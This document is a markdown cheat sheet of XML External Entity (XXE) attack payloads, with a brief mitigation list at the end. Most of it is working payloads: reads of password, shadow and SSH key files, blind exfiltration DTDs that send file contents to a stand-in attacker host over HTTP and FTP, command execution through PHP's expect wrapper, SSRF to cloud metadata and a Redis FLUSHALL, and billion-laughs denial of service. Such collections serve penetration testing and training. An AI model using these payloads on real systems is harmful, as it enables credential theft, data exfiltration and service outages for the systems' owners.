# XML External Entity (XXE)

> XXE is an injection attack against an XML parser that resolves external entities. It can lead to file disclosure, SSRF, and in some cases RCE.

## Summary

- [Detection](#detection)
- [Classic File Read](#classic-file-read)
- [Blind XXE (OOB)](#blind-xxe-oob)
- [Error-Based](#error-based)
- [Parameter Entities](#parameter-entities)
- [XInclude](#xinclude)
- [XXE in SVG / DOCX / SOAP](#xxe-in-svg--docx--soap)
- [PHP Wrappers](#php-wrappers)
- [SSRF via XXE](#ssrf-via-xxe)
- [DoS — Billion Laughs](#dos--billion-laughs)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

Submit minimal XML and observe the parser behavior:

```xml
<?xml version="1.0"?>
<root>hello</root>
```

Then add an external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x "PoC">]>
<root>&x;</root>
```

If `PoC` is reflected, the parser resolves entities.

## Classic File Read

### Linux

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```

### Windows

```xml
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]>
<root>&x;</root>
```

Other interesting targets:

```
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///root/.ssh/id_rsa
file:///var/log/apache2/access.log
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
```

## Blind XXE (OOB)

Hosted DTD on `https://attacker.tld/x.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
%wrap;
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.tld/x.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

### Pure OOB (no in-band reflection)

External DTD using FTP for multi-line data:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.tld/%file;'>">
%eval;
%exfil;
```

## Error-Based

When the file content is embedded in a parser error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Parameter Entities

Used inside the DTD itself with `%` instead of `&`:

```xml
<!ENTITY % name "value">
%name;
```

Combine when nested entity definitions are blocked:

```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.tld/x.dtd">
  %ext;
]>
```

## XInclude

When you can't control the doctype but can inject inside an element parsed with `xinclude`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## XXE in SVG / DOCX / SOAP

### SVG file upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&x;</text>
</svg>
```

### DOCX / XLSX / ODT

These are ZIPs containing XML. Modify `word/document.xml` (or similar) to add the DOCTYPE / entity, then re-zip.

### SOAP

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns:Query xmlns:ns="http://example.com">&x;</ns:Query>
  </soap:Body>
</soap:Envelope>
```

## PHP Wrappers

When the target runs PHP:

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY x SYSTEM "expect://id">          <!-- requires expect ext -->
<!ENTITY x SYSTEM "data://text/plain,Hello">
```

## SSRF via XXE

```xml
<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&x;</root>
```

```xml
<!ENTITY x SYSTEM "http://internal.intranet.tld:8080/admin">
<!ENTITY x SYSTEM "gopher://internal.tld:6379/_FLUSHALL">
```

## DoS — Billion Laughs

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
```

(Do **not** use this against systems you don't own — it can crash production services.)

### Quadratic Blowup

```xml
<!ENTITY a "aaaa...(50,000 'a' characters)...">
<root>&a;&a;&a;&a;...(several thousand)</root>
```

## Mitigation

- **Disable DTD processing** in your XML parser (`disallow-doctype-decl = true`).
- Use **`XMLConstants.FEATURE_SECURE_PROCESSING`** (Java).
- In Python:
  - `defusedxml` library instead of stdlib `xml.etree.ElementTree`.
- In .NET:
  - `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`.
- In PHP:
  - `libxml_disable_entity_loader(true)` (deprecated in 8.0+, default behavior is safer now).
- Avoid XML where possible; prefer JSON.

## References

- [OWASP — XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
- [HackTricks — XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
